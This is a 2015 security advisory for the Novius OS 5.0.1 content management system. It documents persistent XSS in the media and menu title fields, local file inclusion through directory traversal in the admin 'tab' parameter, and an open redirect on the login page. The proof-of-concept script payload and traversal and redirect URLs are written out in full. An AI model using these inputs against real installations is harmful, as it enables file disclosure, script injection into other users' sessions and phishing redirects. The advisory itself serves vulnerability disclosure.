@@ -1,0 +1,150 @@
+[+] Credits: John Page ( hyp3rlinx )
+
+[+] Domains: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-NOVIUSOS0629.txt
+
+
+
+Vendor:
+=======================
+community.novius-os.org
+
+
+Product:
+===============================================================
+novius-os.5.0.1-elche is a  PHP Based Content Management System
+community.novius-os.org/developpers/download.html
+
+
+
+Advisory Information:
+===================================
+Persistent XSS, LFI & Open Redirect
+
+
+
+Vulnerability Details:
+======================
+
+Persistent XSS:
+---------------
+Users can inject XSS payloads that will be saved to MySQL DB, where they
+will execute each time when accessed.
+
+1- In Admin under 'Media Center' users can inject XSS payloads and save to
+the 'media_title' field for a saved media file,
+   create a new media page inject payload click save and then select
+visualize.
+
+2- Under Website menus area users can inject XSS payloads and save for the
+'menu_title' field for a Website menu.
+
+If we view browser source code at
+http://localhost/novius-os.5.0.1-elche/novius-os/?_preview
+the XSS is output to its HTML entities.
+
+e.g.
+<title><script>alert('HELL')</script></title>
+
+But within the same webpage for <h1> tag you can see it is not.
+
+e.g.
+<div id="block-grid" class=" customisable col-md-12 col-sm-12 col-xs-12
+main_wysiwyg"><h1 id="pagename"><script>alert('HELL')</script></h1>
+
+
+Local File Inclusion:
+---------------------
+We can directory traverse access and read files outside of the current
+working directory in the Admin area by abusing the 'tab' parameter.
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=../../../../
+
+
+
+Open Redirect:
+--------------
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/nos/login?redirect=
+is open to abuse by supplying an malicious a location or file.
+
+
+
+XSS Exploit code(s):
+====================
+In 'Media Center' create a new media file, click edit and inject XSS
+payload for the 'title' field click save and then select visualize.
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=admin/noviusos_media/media/insert_update/1
+
+vulnerable parameter:
+media_title
+
+In 'Website Menu' create a new website menu item and inject XSS payload
+click save and then select visualize.
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=admin/noviusos_menu/menu/crud/insert_update%3Fcontext%3Dmain%253A%253Aen_GB
+http://localhost/novius-os.5.0.1-elche/novius-os/?_preview=1
+
+vulnerable parameter:
+menu_title
+
+
+
+LFI:
+----
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=../../../SENSITIVE-FILE.txt
+
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/?tab=../../../../xampp/phpinfo.php
+
+
+
+Open Redirect:
+--------------
+http://localhost/novius-os.5.0.1-elche/novius-os/admin/nos/login?redirect=http://www.SATANSBRONZEBABYSHOES.com
+
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification: NA
+June 29, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=================
+Med
+
+
+
+Description:
+================================================================================
+
+Request Method(s):         [+] GET & POST
+
+
+Vulnerable Product:        [+] novius-os.5.0.1-elche
+
+
+Vulnerable Parameter(s):   [+] media_title, menu_title, tab, redirect
+
+
+Affected Area(s):          [+] Login, Web Pages, Media Center & Website
+Menu area
+
+
+=================================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that
+it is not altered except by reformatting it, and that due credit is given.
+Permission is
+explicitly given for insertion in vulnerability databases and similar,
+provided that
+due credit is given to the author. The author is not responsible for any
+misuse of the
+information contained herein and prohibits any malicious use of all
+security related
+information or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
